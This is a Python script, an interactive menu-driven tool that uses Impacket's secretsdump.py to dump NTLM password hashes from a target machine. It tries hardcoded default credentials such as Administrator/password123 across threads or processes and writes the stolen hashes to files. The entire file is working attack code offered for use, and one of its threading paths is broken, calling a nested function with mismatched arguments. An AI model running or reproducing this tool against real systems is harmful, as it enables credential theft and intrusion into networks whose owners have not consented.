import subprocess
import threading
import multiprocessing
import importlib.util
import logging
import sys

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def ensure_impacket_installed():
    if importlib.util.find_spec("impacket") is None:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "impacket"])
            logging.info("Impacket installed successfully.")
        except subprocess.CalledProcessError as e:
            logging.error(f"Error installing Impacket: {e}")
            print(f"Error installing Impacket: {e}")
            return False
    return True

def dump_ntlm_hashes(target_ip, credentials, use_threading, use_multiprocessing):
    if not ensure_impacket_installed():
        return

    def dump_hash(username, password):
        logging.info(f"Attempting to dump NTLM hashes with username: {username} and password: {password}")
        command = ["secretsdump.py", f"{username}:{password}@{target_ip}"]
        try:
            with open(f"ntlm_hashes_{username}.txt", "w") as output_file:
                subprocess.check_call(command, stdout=output_file, stderr=subprocess.STDOUT)
            logging.info(f"Hashes for {username} saved to ntlm_hashes_{username}.txt")
        except subprocess.CalledProcessError as e:
            logging.error(f"Error dumping hashes for {username}: {e}")
            print(f"Error dumping hashes for {username}: {e}")

    if use_threading and use_multiprocessing:
        processes = []
        for username, password in credentials:
            process = multiprocessing.Process(target=run_threaded_dump, args=(target_ip, username, password))
            processes.append(process)
            process.start()
        for process in processes:
            process.join()
    elif use_threading:
        threads = []
        for username, password in credentials:
            thread = threading.Thread(target=dump_hash, args=(username, password))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
    elif use_multiprocessing:
        processes = []
        for username, password in credentials:
            process = multiprocessing.Process(target=dump_hash, args=(username, password))
            processes.append(process)
            process.start()
        for process in processes:
            process.join()
    else:
        for username, password in credentials:
            dump_hash(username, password)

def run_threaded_dump(target_ip, username, password):
    try:
        thread = threading.Thread(target=dump_hash, args=(target_ip, username, password))
        thread.start()
        thread.join()
    except Exception as e:
        logging.error(f"Error in threading: {e}")
        print(f"Error in threading: {e}")

def get_user_input():
    logging.info("Getting user input for IP address and login info.")
    print("\n==============================")
    print("  NTLM Hash Dumping Tool Menu")
    print("==============================")
    
    print("\nSelect IP address option:")
    print("1. Use default IP (192.168.1.100)")
    print("2. Enter your own IP")
    ip_option = input("Enter your choice (1 or 2): ").strip()

    if ip_option == "1":
        ip_address = "192.168.1.100"
    elif ip_option == "2":
        ip_address = input("Enter the IP address: ").strip()
    else:
        print("Invalid choice. Using default IP (192.168.1.100).")
        ip_address = "192.168.1.100"

    print("\nSelect login info option:")
    print("1. Use default hardcoded login info")
    print("2. Load login info from a list")
    login_option = input("Enter your choice (1 or 2): ").strip()

    if login_option == "1":
        login_info = [
            ("Administrator", "password123"),
            ("User1", "passw0rd"),
            ("User2", "123456"),
        ]
    elif login_option == "2":
        login_info = load_login_list()
    else:
        print("Invalid choice. Using default hardcoded login info.")
        login_info = [
            ("Administrator", "password123"),
            ("User1", "passw0rd"),
            ("User2", "123456"),
        ]

    print("\nDo you want to use threading? (default is Yes)")
    print("1. Yes")
    print("2. No")
    threading_option = input("Enter your choice (1 or 2, default is 1): ").strip()

    if threading_option == "2":
        use_threading = False
    else:
        use_threading = True

    print("\nDo you want to use multiprocessing? (default is Yes)")
    print("1. Yes")
    print("2. No")
    multiprocessing_option = input("Enter your choice (1 or 2, default is 1): ").strip()

    if multiprocessing_option == "2":
        use_multiprocessing = False
    else:
        use_multiprocessing = True

    return ip_address, login_info, use_threading, use_multiprocessing

def load_login_list():
    logging.info("Loading login list.")
    login_list = [
        ("Admin", "adminpass"),
        ("Guest", "guestpass"),
        ("TestUser", "testpass"),
    ]
    print("\nAvailable login info:")
    for index, login in enumerate(login_list, start=1):
        print(f"{index}. Username: {login[0]}, Password: {login[1]}")
    choice = input("Select login info by number: ").strip()
    try:
        choice = int(choice)
    except ValueError:
        choice = -1

    if 1 <= choice <= len(login_list):
        return [login_list[choice - 1]]
    else:
        print("Invalid choice. Using default hardcoded login info.")
        return [
            ("Administrator", "password123"),
            ("User1", "passw0rd"),
            ("User2", "123456"),
        ]

def main():
    try:
        ip_address, login_info, use_threading, use_multiprocessing = get_user_input()
        logging.info(f"Using IP address: {ip_address}")
        logging.info(f"Using login info: {login_info}")
        logging.info(f"Using threading: {use_threading}")
        logging.info(f"Using multiprocessing: {use_multiprocessing}")
        dump_ntlm_hashes(ip_address, login_info, use_threading, use_multiprocessing)
    except Exception as e:
        logging.error(f"An error occurred in the main function: {e}")
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
